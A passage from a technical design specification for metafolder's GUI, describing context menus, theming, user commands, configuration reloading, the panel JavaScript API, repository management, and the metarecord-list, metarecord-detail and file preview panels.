and the =mfr_path= treeref). They come from =/__file-actions.js=, whose
clipboard is one realm-wide singleton, so a Cut/Copy in any of them pastes in
another (the file manager included). List panels tag each file row with
=data-mf-path= (and =data-mf-isdir=/=data-mf-name=) so a ready-made provider
resolves the clicked row; the file-manager and metarecord-detail supply the
items from their own row/record menu directly.

Right-clicking anywhere else shows the *default menu*: =Copy= (the text
selection at open time; disabled when nothing is selected), the everyday
layout commands (=panel:toggle split=, =panel:swap=) and =devtools:open=.
The shell installs it for its own areas (tab bar, slot headers, status
bar) and the shim installs one per panel document. It stands down where a
more specific right-click behaviour exists: editable text fields, the tab
bar's right-click (assign to the other slot), and any element handler
that opened its own menu. Panels prepend their own metarecords to it with
=metafolder.contextMenu.addDefaultItems(event => items)=.

Where a per-element context menu makes sense, panels show one via
=metafolder.contextMenu(event, items)= (see [[*The =metafolder= API]]); the
shared implementation lives in =/__menu.js=. The menu is rendered in the
document that opened it (a menu opened inside a panel iframe is clipped
to that iframe), positioned at the pointer (flipped at the viewport
edges), and dismissed by =Escape=, a click outside, or opening another
menu. =Up= / =Down= / =Enter= navigate it, and typing jumps to the first
enabled item whose label starts with the typed prefix (native-select
typeahead: the buffer resets after a second's pause, repeating one letter
cycles through its matches). While a menu is open the keybinding matchers
stand down — regardless of which copy of the menu module opened it, the
shell's bundled one or the =/__menu.js= one panels import — so its
navigation and typeahead keys never trigger panel commands.
Items are grouped under non-interactive *category headers* (=mf-menu-header=) so
a right-click reads at a glance which operations act on the *metarecord*, its
*file*, the selected *text*, or the *view*: the shared file actions carry a
=File= header, each panel prepends a =Metarecord= header to its record
operations, and the default menu labels its selection =Copy= as =Text= and the
layout commands as =View=. A header is not selectable and is skipped by keyboard
navigation and typeahead. A menu item is either =\{label, action?, disabled?\}=,
a =\{header\}= category label, or the string =-= for a separator.

Every menu is *normalized* before it is shown (=orderMenu= in =/__menu.js=), so
the same right-click reads the same way in every panel whatever order the panel
happened to push its items in:

- The categories always come in one canonical order — =Metarecord=, =File=,
  =Directory=, =Ignore=, =Text=, =View= — and a header that is not in that list
  keeps its relative position after the known ones.
- Items pushed before any header (a panel's single primary action, e.g. the
  duplicates panel's "Keep this copy" or a picker's "Pick this folder") lead the
  menu, above the categories.
- Two providers contributing the same category are merged into one, and a
  category with no entry is dropped along with its header.
- *Separators are derived, never authored*: the =-= a builder passes is dropped
  and exactly one rule is drawn at each category boundary. A rule therefore
  always means "a new category starts here" and never cuts a category in half.
  The one exception is a menu with no header at all (a two-item row menu, the
  panel-type picker), which is passed through untouched — its author's =-=
  included.

Appearance: classes =mf-menu=, =mf-menu-item= (=active=,
=disabled=), =mf-menu-header= and =mf-menu-separator=, with built-in defaults
that the user stylesheet overrides.

** Style and theming

The GUI loads =~/.config/metafolder/gui/style.css= at startup and applies it
globally to the WebView. The stylesheet is shipped and installed by
=metafolder-sync-config= (see [[file:spec-config.org][spec-config]]); a missing
or unreadable file is a startup error, not a fall back to an embedded default.
The =config:open= settings view shows the active CSS path and offers a reload
button (=config:reload style=); the GUI also auto-reloads on file change via
inotify.

** User commands

=~/.config/metafolder/gui/commands.js= is a JavaScript module the shell imports
at startup. Its default export maps a command name to its definition — the key
*is* the name, so there is no registration call:

#+BEGIN_SRC js
export default {
  'user:tag-query': {
    label: 'Insert a tag filter in the simplified query',
    args: [{ name: 'tag', prompt: () => 'Tag?', complete: (mf) => tagPaths(mf) }],
    run: (mf, tag) => mf.invoke(`metarecord-list:insert simplified #=${tag}`),
  },
};
#+END_SRC

Every function is handed =mf= first — the same =metafolder= object panels get
(see [[*The =metafolder= API]]), so there is one API to learn — and =run= then
receives the arguments collected inline or through the minibuffer. =label=
defaults to the name, =log= to true, =args= is an ordinary [[*Command][argument
declaration]], so a user command gets interactive prompting, the =…= marker and
the listing's keybinding expansion for free.

A user command is a *builtin registered at runtime*: it has no owner, because
its code is in the shell realm and not in any panel. Its =mf= is therefore
scoped to the **focused workspace**, read at each call rather than captured —
a user command acts wherever the user is when it fires. The panel-only members
(=panelType=, =pageSize=, =defaults=, the visibility hooks) are absent rather
than faked, and =commands.register= is not offered: a command file declares its
commands by exporting them, and a second way to do it could only get out of
step with the file.

Builtins win a name collision. A =commands.js= entry can add to the command set
but never silently replace part of it.

A command here is expected to *compose existing commands* through =mf.invoke=.
Something that cannot be said that way is usually a base command missing rather
than a reason to reach into the daemon from a config file.

*Failure is loud.* A missing file fails at startup like any other missing
configuration (=metafolder-sync-config= ships a default, so its absence means
an incomplete installation). A file that is present but does not parse, or
whose export is malformed, can only be caught by the WebView — Rust has no
JavaScript engine — so the shell imports it during boot, *outside* the
per-module error boundary panels get, and a rejection leaves the initialisation
banner on screen with the JavaScript error, line and column included. No panel
is ever mounted, so *no* panel command is registered either and the GUI is
unusable — configuration is corrected before the GUI runs. (The scripting API
still answers for the handful of commands Rust serves on its own, such as the
layout primitives: its listener is installed before the import. Nothing that
needs a panel, or a user command, exists.)

=config:reload commands= re-imports the module without a restart, forgetting
the commands the previous version registered first, so a definition deleted
from the file leaves the listing with it.

** Reloading configuration

=config:reload <what>= re-reads user configuration without a restart:

| =what= | effect |
|--------+--------|
| =keybindings= | re-reads =gui/keybindings.toml= and pushes the compiled table; the editor in [[*Configuration][=config:open=]] already applied its own edits live, this is for a file edited *outside* the GUI |
| =style= | re-reads =gui/style.css= and emits the change, so the shell document *and* every panel's adopted stylesheet follow (the settings view's reload button goes through this) |
| =grammar= | re-reads =core/query-grammar=; core reads the file on every call, so the GUI's startup snapshot was the only thing making an edit need a restart |
| =commands= | re-imports =gui/commands.js= (see [[*User commands]]), forgetting what the previous version registered |
| =all= | the four above, in that order |

Reloading keybindings drops the in-memory suggestions panels contributed with
=metafolder.addKeybinding=, since the file is the whole table; a panel
re-registers them when it is next instantiated. A script's temporary bindings
survive — the push layers them back on.

Three configuration files are deliberately *not* reloadable, and the reasons
are worth stating because their absence looks like an oversight:
- =core/ignore-presets.toml= is *already* live: it is read on every invocation
  and nothing caches it, so there would be nothing to refresh.
- =gui/config.toml= is only half reloadable. =gui-port= bound the HTTP server
  and =[settings]= was consumed when the polling tasks were spawned; =[page-size]=,
  =[panels]= and =[panel-defaults]= are frozen into each panel instance when it
  mounts. Refreshing the other half alone would leave the GUI in a state no
  configuration file describes, which is worse than asking for a restart.
- =gui/panel-types/= is served from disk per request, so the *server* side is
  already live; what is stale is the WebView's module cache, and clearing it
  means tearing down panel instances that are deliberately kept for the whole
  session (and sub-modules like =./columns.js= would still not be re-imported).

** Panel type system

*** Directory layout

Panel types live under =~/.config/metafolder/gui/panel-types/=:

#+BEGIN_SRC
~/.config/metafolder/gui/panel-types/
  metarecord-list/
    index.html        ← entry point
  metarecord-detail/
    index.html
  file/
    index.html
  message/
    index.html
  log/
    index.html
  repos/
    index.html
  my-custom-panel/    ← user-defined
    index.html
#+END_SRC

Built-in types ship as pre-populated examples installed by
=metafolder-sync-config= (see [[file:spec-config.org][spec-config]]). The user
edits them freely on the config repository's =main= branch; upgrades are a git
merge of the shipped =default= branch, not a copy-if-unmodified pass. There is
no =panel-types-defaults/= mirror.

Panel types are served by the GUI's own HTTP server (the GUI API port,
default 7524): =GET /panel/<name>/<file>=, **verbatim** (permissive CORS, so
the shell can fetch/=import()= them from its own origin). The shell mounts a
panel into a Shadow DOM root and applies the user stylesheet itself (no
serve-time injection). Raw local files for the =file= panel type are served by
=GET /fsraw?path=...= with HTTP Range support (media seeking). Poster
thumbnails (videos and GIFs) are served by =GET /thumbnail?path=...=: a small
still PNG of one frame
extracted with =ffmpeg= and cached on disk inside the file's repository, under
=<repo>/.metafolder/internal/thumbnails= (keyed by the source's
path/mtime/size), so the cache is scoped to the repo and removed with it. The
owning repository is resolved from the daemon's =GET /repos= (each entry's
=root= and =internal_dir=) by longest-root match — the innermost repo when
repos are nested — not by walking the filesystem, so the external-database
layout is handled and a stray =.metafolder/= directory cannot be mistaken for a
repo. A file inside no repository is not cached and gets no thumbnail — the
panel shows a glyph. A video must never be
handed to an =<img src=/fsraw>= — WebKit would decode the whole file and crash
the web process — so the panels point video tiles at =/thumbnail= instead; a
non-2xx (unsupported type, not in a repo, missing decoder…) falls back to a
type glyph. GIF tiles also go through =/thumbnail= — served raw they would
*animate*, and a grid of animated tiles is a distraction — but their non-2xx
fallback is the animated =/fsraw= original first (safe for an =<img>=), then
the glyph.

*** The =metafolder= API

The shell passes a =metafolder= object to each panel type's =mount(root,
metafolder)=. It provides three namespaces:

**** =metafolder.daemon=

Async access to the daemon HTTP API (proxied by the Rust backend) plus a
few helpers:

#+BEGIN_SRC js
// Raw call: resolves to {status, body} whatever the status.
const response = await metafolder.daemon.request('GET', '/repos')
// Same, but throws Error(body.error) on status >= 400 and returns the
// body directly — the usual form inside try/catch.
const metarecord = await metafolder.daemon.call('GET', `/repos/${repo}/metarecords/${uuid}`)
// Lazy memoized mfr_path resolution (see "Path display").
await metafolder.daemon.resolvePath(repo, uuid)
await metafolder.daemon.resolveTreeRef(repo, { parent, name })
metafolder.daemon.invalidatePath(repo, uuid)
// Absolute root directory of a repository (cached GET /repos).
const root = await metafolder.daemon.repoRoot(repo)
// Absolute path of the repo's .metafolder/internal/ directory (cached
// GET /repos) — the only path always excluded from tracking.
const internal = await metafolder.daemon.repoInternalDir(repo)
// Absolute filesystem paths of a metarecord: one per mfr_path tree_ref
// (multi-map), unresolvable (stale) refs skipped.
const paths = await metafolder.daemon.metarecordPaths(repo, metarecord)
#+END_SRC

**** =metafolder.query=

Pure query transformations, run **locally** in the GUI backend (the shared
=metafolder-core= engine) — never a daemon round-trip. Both throw on a
parse/grammar error.

#+BEGIN_SRC js
// Compiles normal DSL text to the Query JSON IR.
const ir = await metafolder.query.parse('rating > 3')
// Expands simplified-language text to normal DSL text (relative-date macros
// use the local clock).
const dsl = await metafolder.query.expand('genre=jazz rating>=4')
#+END_SRC

(=metafolder.daemon.parseQuery= / =expandQuery= remain as deprecated aliases
for older panels.)

**** =metafolder.workspace=

Reactive per-workspace key-value store.

#+BEGIN_SRC js
metafolder.workspace.set('selected_metarecord', { uuid, repo })
const metarecord = metafolder.workspace.get('selected_metarecord')
metafolder.workspace.onChange('selected_metarecord', ({ uuid, repo }) => { ... })
#+END_SRC

Standard keys: =active_repo=, =selected_paths=, =selected_metarecord=,
=selected_metarecords=. Panel types may use namespaced custom keys (e.g.
=my-panel:state=).

**** =metafolder.pick=

Opens a value picker (see [[*Value picker]]). =start(spec)= creates a linked
picker workspace in the state =spec= describes (including the =result= kind —
=uuid= or =path=) and returns its id; the result arrives later as the
=pick_result= workspace variable, which the caller matches by =token=. The
panel-shim =createPickRunner(metafolder)= wraps this: =run(\{field, valueType\})=
for =ref=/=tree_ref= uuid picks, and =request(spec)= as a low-level form (used
by the repos panel to pick a folder with =result: 'path'= and the =file-manager=
panel).

#+BEGIN_SRC js
const token = String(++pickSeq)
metafolder.workspace.onChange('pick_result', (result) => {
  if (!result || result.token !== token) return
  if (!result.cancelled) parentInput.value = result.uuid  // a metarecord uuid
})
await metafolder.pick.start({
  token,
  repo,
  name: 'Pick: tag',
  prompt: 'Select a value for “tag” — Ctrl+Enter to confirm, Ctrl+Esc to cancel',
  panel: { type: 'metarecord-list', vars: { 'metarecord-list:query': seed } },
})
#+END_SRC

**** =metafolder.config=

Read-only access to GUI configuration the panel may need. =pickerSeed(field)=
returns the configured seed query for a =ref= field name (=metarecord-list=
query syntax), or =null= when none is set (see [[*Picker seeds]]). The caller
folds it into the =pick.start= spec, keeping the seed policy on the calling
side.

**** =metafolder.fs=

Direct filesystem access via the GUI backend (Tauri/Rust). Available to all
panel types; not routed through the daemon.

*Paths are handles.* The frontend speaks JSON, so every path it holds is text —
but a POSIX path is a byte string that need not be UTF-8 (see [[file:spec-data-model.org][spec-data-model]]
"Tree names"). Every path crossing this boundary is therefore in the same
=%XX= escaped form the rest of metafolder shows: itself when the path is text,
=/dir/caf%E9.mp4= when it holds a byte no text can represent. A panel slices and
joins it like the plain path it usually is, and hands it back unchanged — to an
=fs= call, to =?path== on =/fsraw=, =/thumbnail= or =/__media-probe= — and the
backend turns it into the exact bytes before touching the disk.

Rendering it lossily instead, as this used to, produced a path that named
nothing: the row appeared in the file manager and *every* action on it failed,
because =caf<?>.mp4= is three bytes where the disk has one.

A handle that spells an escape has two readings, and an operation on the disk
needs one: **existence decides**, the literal file winning when it is really
there. A path that exists under neither reading stays verbatim, so creating
=new%file.txt= makes exactly that.

=readDir= marks an entry whose name needed escaping with =escaped: true=; the
file-manager shows those rows with a ⚠ and says renaming the file is what makes
it ordinary again.

#+BEGIN_SRC js
// List directory contents
const metarecords = await metafolder.fs.readDir('/path/to/dir')
// metarecords: [{name: "foo.mp3", path: "/path/to/dir/foo.mp3", is_dir: false,
//                escaped: false}, ...]

// Stat a single path
const info = await metafolder.fs.stat('/path/to/file')
// info: {path, is_dir, size, mtime}

// Write operations (the file-manager panel's create/copy/move/delete). None
// overwrite an existing destination — a clash rejects rather than clobbers —
// and the daemon is never involved, so a tracked metarecord goes stale until
// the watcher or a reconcile catches up.
await metafolder.fs.mkdir('/path/to/new-dir')      // parent must exist; errors if present
await metafolder.fs.createFile('/path/to/new-file') // empty file; errors if present (never truncates)
await metafolder.fs.move('/from', '/to')            // rename/move (cross-filesystem safe)
await metafolder.fs.copy('/from', '/to')            // file or whole tree; source kept
await metafolder.fs.remove('/path')                 // permanent delete of a file/symlink/tree
#+END_SRC

** Repository management

*** Repo list

Calls =GET /repos= at startup and on explicit refresh. Results populate the
Repo indicator and the =repos= panel type.

*** Init repo

=repos:open-init= is a command of the =repos= panel type. It transforms the
=repos= panel to show an inline form with an optional =name= input and a
=root= input (the daemon API also accepts an external =metafolder= location,
but the GUI does not expose it). The =root= input is paired with a *Browse…*
button that opens a folder picker through the value-picker system (see
[[*Value picker]]): the =file-manager= panel opens in the other slot (started
at the typed path or the home directory, with no active repo so it browses the
raw disk), and the confirmed folder path fills the input — prefilling the name
with the folder name when blank. Submitting calls =POST /repos/init=. On
success the new repo is adopted in place when the current workspace has no
=active_repo= yet (the focused panel switches to =metarecord-list=); when the
workspace already has a repo, the new one is only added to the list (a status
message points the user to it). Init never spawns a workspace. On =409= an
error message appears in the status bar and the form remains open.

*** Load repo

The *Load repo* button of the =repos= panel transforms it to show an inline
form with a single =root= input, also paired with the *Browse…* folder picker.
Submitting calls =POST /repos/load=. On success the loaded repo is adopted in
place when the current workspace has no =active_repo= yet, otherwise it is only
added to the list; like init, load never spawns a workspace.

=repos:load= is the same load without the form: the command opens the folder
picker straight away (a =file-manager= picker on the raw disk, started at the
home directory) and loads the folder that is picked, adopting it under the same
rule. Cancelling the picker loads nothing. Since there is no form to land in,
a =POST /repos/load= failure — the folder is not a repository — is reported in
the status bar. The form remains for typing or correcting a path by hand.

The intended flow is: =repos:open= (global) → navigate to the =repos= panel
→ select a loaded repo or trigger =repos:open-init= / =repos:load= from there.

*** Tracking notices

Three conditions leave a repository recording less than it looks like it does,
and each makes it look broken if it is not said out loud. All three appear on
the repository's own row, polled on the task block's cadence — so one triggered
from the CLI shows up here too.

The per-repo task block lists the repository's in-flight tasks with a *Stop*
button for the cancellable kinds — =flush= among them (see
[[file:spec-tasks.org][spec-tasks.org]] "Cancellation"). Stopping a flush is not
a plain cancel: it *pauses* the repository's tracking, so the panel says so
rather than leaving a repository that silently records nothing.

Under each repository, when =GET /repos/:repo/watch= reports =paused=, the row
shows =tracking paused — N event(s) waiting= in the warning colour (amber, the
"act on this" colour the unmounted-volume marking already uses — not the error
red: nothing is broken) next to a *Resume* button calling
=POST /repos/:repo/watch/resume=. The state is polled on the same cadence as the
task block, so a pause triggered from the CLI shows up here too.

The other two come from the watch budget (see
[[file:spec-file-tracking.org][spec-file-tracking.org]] "The watch budget"), and
they are coloured by *who decided*, not by how bad they look:

- =N subtree(s) unwatched= — amber, like the pause: the daemon reached its own
  ceiling and recorded the frontier, the repository is still fully tracked, and
  this is a state to act on. It is a *button*: a count means little without the
  names, so it calls =GET /repos/:repo/watch/exceeded= and writes them to the
  workspace's message log.
- =out of inotify watches= — error red: the kernel is refusing watches to a
  daemon that has *not* reached its ceiling, so another program holds them and
  **nothing was recorded**. It is not a state the user chose and there is no
  button for it — the remedy is outside metafolder. It is shown for exactly as
  long as the condition lasts, which is why the daemon reports it as a field of
  the watch status and not as a diagnostic: the diagnostics ring holds 500
  entries and would evict such a notice under its own repetitions.

** Metarecord management

*** =metarecord-list= panel type

Displays metarecords for the active repo (=active_repo= workspace variable)
filtered by an embedded query written in the two-zone query editor at the top
of the panel (see [[*Query editor (two zones)]]). An empty query matches all
metarecords.

Default display mode: =table= with columns =mfr_path:path= (resolved path),
=mfr_type=, =&version= — configurable as
=[panel-defaults.metarecord-list].columns= (see [[*Panel defaults]]), and
overridden by the stored =metarecord-list:columns= of the workspace. The
=metarecord-list:set mode= command switches between display modes; grid mode
names each tile with =[panel-defaults.metarecord-list].grid-name-column=
(default =mfr_path:path=).

The columns input is a separate row below the query editor, with its own
/Apply/ button (=metarecord-list:focus columns= focuses it). The panel always
queries with =select: '*'=, so applying new columns is a pure re-render — no
request.

Each column is one token of the columns input (space- or comma-separated,
with spaces around =|= tolerated; an empty input restores the defaults;
invalid tokens are reported under the input and the previous columns are
kept). A token combines two orthogonal operators — a /projection/ (=:mode=)
and a /follow/ (=>=) — plus a fallback (=|=):

- =name= — the raw field value(s). A multi-map field shows every row in
  the cell, comma-joined. =version= is an ordinary field name here.
- =name:aspect= — projects a =tree_ref= value: =:value= (the leaf name),
  =:parent= (the parent's uuid), =:path= (the path from the repository root —
  the root shows =/=; a stale/unresolved =tree_ref= falls back to its leaf
  name), =:raw= (the parent/name couple, the default). An aspect that does not
  apply to the value's type falls back to the raw display. These are the *same
  four aspect names the query DSL uses* (=field:aspect=, see
  [[file:spec-query.org][spec-query.org]] "Field aspects"), so reading a value
  is spelled the same way in a column, in the finder and in a predicate.
- =name>sub= — follows a =ref=/=refbase= value to the target metarecord and
  shows its =sub= field rows (comma-joined; e.g. =tag>label=). =sub= may
  itself be projected (=tag>path:value=, or =tag>path:path= to resolve the
  target's tree path). One =>= only — no deep chains. A missing target
  metarecord falls back to the raw uuid; a present target whose =sub= field
  is absent yields no value (so a fallback can take over).
- =a | b= — fallback: the cell shows the first alternative that yields a
  value (e.g. =tag>label | tag>path:value= — the label if any, else the
  tag's leaf name).
- =&uuid= / =&version= — the metarecord's own uuid and version. These are
  metarecord metadata, not fields (=&= cannot appear in a field name), so a
  user field named =version= never collides with them.

Sorting always uses the underlying raw field (the daemon sorts raw
values): clicking a =tag>label= header sorts by the =tag= uuids (a
fallback sorts by its first alternative's field). Meta
(=&=) columns are not sortable. Column widths are adjustable by dragging
the right edge of a header. The column list and the widths are persisted
in the =metarecord-list:columns= and =metarecord-list:column-widths= workspace
variables, so they survive the panel and can be set by scripts.

Supports sorting by column, multi-selection (=selected_metarecords=), and full
keyboard navigation.

When the user moves the selection, =metarecord-list= writes the highlighted metarecord
to =workspace.selected_metarecord= and sets =workspace.selected_paths= to the list
of resolved absolute paths from all =mfr_path= field rows of that metarecord
(empty list if the metarecord has no valid =mfr_path=). Other panels update
reactively (see [[*Cross-panel selection]]).

**** Finder (quick filter)

A search box at the top of the panel — the /finder/ — is an incremental
[[file:spec-query.org][OSM]] (ordered-substring) filter, the ergonomic way to
find a metarecord by a fragment of its name/label and/or path. As the user
types (debounced), it re-runs the query; the terms are the input split on
whitespace. =metarecord-list:focus finder= focuses it (default keybinding =/=; the
structural query editor moves to =Ctrl+/=). The finder and the query input
each keep a per-repository input history (see [[*Input history]]); an entry is
recorded on explicit submission (=Enter= / the apply commands), not by the
debounce.

The finder builds an OSM sub-query *OR-combined across a set of target fields*
and *AND-ed onto the base query* (the two-zone editor below is unchanged), so a
structural query (e.g. =mf_schema = "tag"=) and a typed fragment compose. Each target
carries its aspect: =:path= (a =tree_ref= field's assembled path, compiling to
=osm=) or =:value= (the field's own value, compiling to =osmd=) — the same
aspect names the columns and the query DSL use. The aspect is *explicit* in the
default config (=field:path= / =field:value=), so it never depends on the async
field catalog; a bare =field= (no aspect) auto-detects from the catalog
(=tree_ref= → path, else value). An unknown field just contributes nothing, so a target list
is always safe. The bulk-edit and the result count operate on this *effective*
(finder-filtered) query. The panel publishes it (as the query IR actually run)
in the =metarecord-list:effective-query= workspace variable on every fetch, so
another panel — the =metarecord-detail= bulk field-edit commands — can target
exactly what the list shows, the live finder narrowing included.

It publishes the same query as *DSL text* next to it, in
=metarecord-list:effective-query-text= (=""= = match all), for a script asking
what the panel shows (=mf gui query=): text is what =mf metarecord -q= takes and
what a script composes with (=(<query>) AND mfr_path ->* "/dir"=). The text is
not un-parsed from the IR — the base part is the normal DSL the editor already
expanded, and the finder clause is written by a text builder beside the IR one
(=osm(field:path, "…")= / =osmd(field:value, "…")=, OR-ed and parenthesised,
terms escaped). The IR stays authoritative for what the panel runs; the two
builders are pinned to one meaning by shared vectors
(=panel-shim/finder-vectors.json=), which the frontend suite checks against
both builders and a Rust test checks through the real parser. The variable
=metarecord-list:normal-query= is *not* a substitute: it mirrors the normal-DSL
zone and is only written while that zone is shown.

The searched fields default to =mfr_path:path label:value name:value=,
configurable as =[panel-defaults.metarecord-list].finder-fields= (see
[[*Panel defaults]]) and overridable per workspace via the
=metarecord-list:finder-fields= variable (a list of =field= or =field:aspect=
entries); a value picker may seed it. The finder
text itself persists in =metarecord-list:finder=. When the panel is opened as a
value picker (its workspace has a =pick_request=), the finder is focused on
first display.

**** Query editor (two zones)

The query is written in the [[file:spec-query.org][simplified query language]]
and transpiled to the normal DSL before execution. The editor exposes both
forms, so the user can write quickly *and* drop to the full DSL when a query is
too specific for the simplified surface — and learn the mapping by watching it.

- *Zone A (simplified)* is always visible and has its own /Apply/ button;
  =metarecord-list:focus simplified= focuses it — and unfreezes B first,
  (=e s=) focuses it *and* unfreezes B first, so what is typed in A drives the
  query again. An empty zone A matches all.
- *Zone B (normal DSL)* below A is *revealed by default* — the expanded DSL is
  what actually runs, so showing it teaches the mapping — and a toggle hides it
  again; the choice persists per workspace (only an explicitly stored =false=
  hides it). While B is shown and **not frozen**, it is a read-only live mirror
  of =expand(A)= (debounced ~120–150 ms, via =metafolder.query.expand=). A *Freeze* checkbox next to B decouples
  it: B becomes editable and authoritative, and editing A no longer changes it.
  Unfreezing re-syncs B from =expand(A)= — manual edits to B are then discarded
  (accepted).

Execution always runs the content of B; when B is hidden, B is computed as
=expand(A)= on Apply. The resulting DSL text is compiled with
=metafolder.query.parse= and the query is issued (with =select: '*'=, as
above).

Errors appear under the zone that produced them: a grammar/expansion error under
A, a =parse_query= error under B (where the offending DSL text is visible when B
is shown).

The editor state persists in workspace variables, so it survives the panel and
can be set by scripts:

| Variable                        | Meaning                                                                    |
|---------------------------------+----------------------------------------------------------------------------|
| =metarecord-list:query=         | zone A text (simplified)                                                   |
| =metarecord-list:normal-shown=  | whether zone B is revealed (unset = revealed)                               |
| =metarecord-list:normal-frozen= | whether zone B is frozen (decoupled, authoritative)                        |
| =metarecord-list:normal-query=  | zone B text — authoritative while frozen, otherwise a cache of =expand(A)= |

*Run a query from another panel*: the panel also honours a
=metarecord-list:query-request= workspace variable (={ dsl, nonce }=), set by
=metarecord-list:folder= (a folder's contents) or by =treeref:list-refs=
(what points at a tree node) — it puts the DSL in zone B, *shown and frozen*,
and runs it. A
query the GUI wrote is a starting point, not a mode: frozen zone B leaves it
visible, hand-editable and composable (the same choice
=metarecord-list:query= makes). The
request is honoured both when the panel mounts and
while it is already mounted, the =nonce= making an identical repeated request
re-trigger while the same request acts only once. See
[[*Cross-panel selection]].

*** =metarecord-detail= panel type

When =selected_metarecord= is =null=, displays a centred "No metarecord selected"
message and the /New metarecord/ button.

Otherwise calls =GET .../metarecords/:uuid= and displays all fields. Each field
row shows name, value, an edit button, and a delete button.

The panel reloads the displayed metarecord when another panel signals a data
change through the =metarecords:dirty= workspace variable (log navigation,
file-manager tracking, …) — unless an edit is in progress: reloading
would silently discard it, so the stale view persists until the edit is
saved or cancelled.

Reference values are clickable (=valueEl=, see [[*UI helpers: =/__ui.js=]]):
clicking the uuid of a =ref=/=refbase=, the parent of a =tree_ref= or the
metarecord of an =externalref= sets =selected_metarecord= to the referenced metarecord —
the panel follows it like any other selection change (the edit guard below
applies). For an =externalref= the target repository is the reference's;
loading fails with the usual error message when that repository is not
loaded.

Following a reference is a *navigation*: =metarecord:back= (default
=backspace= or =left=) returns to the metarecord shown before, and walks back
out of a whole chain of them. The trail records every move of
=selected_metarecord= the panel sees, wherever it came from — a reference
click here, a row picked in =metarecord-list=, a script — since the selection
is a workspace variable no panel owns. (=Enter= keeps its meaning in this
panel, editing the field under the cursor.)

Under a reference value, a dim *annotation line* names the target in human
terms, since a uuid does not:
- a =tree_ref= shows its resolved path;
- a =ref= whose field has a *completion seed* (see [[*Ref value completion]])
  shows the target's path in the seed forest — the field that says a value is
  entered as a path in that forest is exactly the one that says how to read it
  back. This is what makes tag values legible: a tag's hierarchy lives in its
  =tree_ref= =path= and its name is optional, so =tag= / =negative_tag= /
  =mixed_tag= would otherwise show nothing but a uuid;
- otherwise (or when the target is not in the seed forest) the target's =name=
  field, a soft convention — a metarecord with none simply gets no annotation.

Keyboard: =Tab= moves between rows, =Enter= edits, =d= deletes (with
confirmation).

At the bottom of the panel:
- /New metarecord/ button (or =metarecord:create= command) → creates a metarecord
  *immediately* with =POST .../metarecords= and sets it as =selected_metarecord=,
  so the ordinary field-editing commands (=metarecord:open-add-field=,
  =metarecord:field set=, the =m …= sequence) apply to a live record from the
  start — there is no staged, not-yet-saved draft. The command first prompts for
  a schema type (blank = an empty record; a type seeds its template fields, one
  atomic create); the linked =metarecord-list= panel (if any) refreshes. To
  abandon a record created this way, delete it (=metarecord:delete=).
- /Add field/ → =POST .../metarecords/:uuid/fields=
- /Set field/ → =PATCH .../metarecords/:uuid=
- /Delete metarecord/ → confirmation → =DELETE .../metarecords/:uuid=
- /Watch and reconcile/ → visible when the metarecord's =mf_watch= field is
  =false= or absent. Sets =mf_watch = true= (=PATCH=), then calls
  =POST .../metarecords/:uuid/reconcile=. A spinner appears in the status bar
  during the operation; the result is appended to the =message= panel type.
  Useful after adding a metarecord via =file-manager:track= to activate tracking and
  populate the subtree.

Protected =mfr_*= fields are read-only by default; an advanced toggle exposes
a =force= checkbox.

*** =file= panel type

Displays a preview of the file at the currently active path from
=selected_paths=. When =selected_paths= is empty, shows a "no file selected"
message. When =selected_paths= has more than one element (metarecord accessible at
multiple locations), a dropdown in the panel header lets the user choose which
path to preview. Uses the HTML5 =<img>=, =<audio>=, or =<video>= element
depending on the file type; renders documents (PDF) as page images (see
[[*Documents]]); falls back to a plain-text view for text files; shows "no
preview available" for unsupported formats. Works with both tracked and
untracked files.

Which extensions take which route — and how much of a text file is read into
the preview — is configuration, not a constant:
=[panel-defaults.file].image-extensions= / =audio-extensions= /
=video-extensions= / =text-extensions= and =text-preview-limit= (default 256
KiB, fetched with a =Range= header so a multi-GB log only pulls that prefix).
See [[*Panel defaults]]. The text extensions are a *fast path*, not the only
way in: any other extension is decided by sniffing the fetched bytes, so an
unlisted script still previews — while a listed one previews even when the
sniff would reject its encoding (UTF-16 holds NULs).

GIFs are shown as a still of their first frame by default (an animation
looping in a preview is more often a distraction than wanted). While a GIF is
previewed, the media toolbar shows an *animate* checkbox (unchecked by
default, mirrored by the =file:toggle gif-animation= command) that plays the
real animation; the state persists while browsing other files. If the still
frame cannot be produced, the animated original is shown as a fallback.

When the active path is a directory, the panel instead lists its contents as
a thumbnail grid (images as thumbnails via =/fsraw=, videos and GIFs as
still poster-frame
thumbnails via =/thumbnail=, other entries as a type glyph). The grid is
rendered in windows (page size from =[page-size].file= in =config.toml=, default
150 — larger than =metarecord-list='s since each tile is only a lazy =<img>=,
with more appended on scroll) so a folder with many thousands of files neither
freezes on open nor holds every thumbnail at once; a footer shows =shown/total=. Clicking an entry drills in — into a
subdirectory's listing, or a file's inline preview — and a back button in the
header steps back out, returning to the selection once the originally selected
path is reached.

=file:back= (default =Backspace=, the key that goes up in every other panel)
is that same step, and it also applies while the panel is merely *following the
selection*: it then shows the folder holding the previewed file, so the panel
browses upwards instead of being a dead end — the way =Backspace= does in
=file-manager=. The selection is followed again as soon as it changes (or as
soon as the walk back reaches the selected path). At the filesystem root, and
with nothing shown, it does nothing. Since plain =Backspace= is taken, mpv's
"back to normal speed" (=file:speed reset=) keeps the key with shift.

An audio or video file is *not played on sight*: the preview shows its poster
frame (=GET /thumbnail= for a video, the type glyph for audio, which has no
frame to extract) with a hint, and the =<audio>= / =<video>= element is created
only when playback is asked for — =file:play-pause= (default =space=) or a
click on the poster. Mounting the element makes WebKit's web process build a
GStreamer pipeline; one that stalls — a software decoder on a machine with no
GPU, a 4K AV1 stream — freezes the whole window, repaint and keys included,
until it is killed, and an interactive walk that shows one file per question
(the tagging scripts) meets that reliably. The poster costs an out-of-process,
cached =ffmpeg= extraction instead, and nothing is decoded in the web process
until the viewer asks for it. Same bargain as the GIF stills above.

The decoder checks therefore happen at that moment, not on display: the panel
queries =GET /__media-support= on the GUI server and, when the required
GStreamer elements are missing, shows an explanatory message instead of
attempting playback (see [[*Media codec support]]). It then probes the file
itself with =GET /__media-probe=: a missing decoder replaces the preview with a
message naming it, while a decoder that is merely *too slow* for the stream
raises a warning bar above the viewer and plays the file anyway (see
[[*Slow decoders]]). Showing a media file costs neither probe.

When an image or video is previewed, a toolbar offers zoom controls, mirrored
by commands and default keybindings (active only while the =file= panel is
focused):

| Command           | Default key | Effect                                              |
|-------------------+-------------+-----------------------------------------------------|
| =file:zoom in=    | =+=         | Enlarge by one step                                 |
